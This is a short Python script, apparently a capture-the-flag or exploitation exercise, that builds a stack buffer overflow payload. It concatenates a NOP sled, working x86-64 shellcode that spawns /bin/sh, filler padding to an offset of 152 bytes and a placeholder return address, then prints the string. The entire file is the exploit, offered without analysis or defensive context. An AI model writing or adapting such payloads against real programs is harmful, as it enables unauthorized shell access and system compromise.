MAGIC_N = 152

# ricorda 128 - 121 = 7 nop
if __name__ == '__main__':
    
    no_op = '\x90' * 61
    shell_code = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    padding = '\x41' * (MAGIC_N - 61 - 23)
    rip_ = '1234'
    inject = no_op + shell_code + padding + rip_
    print(inject)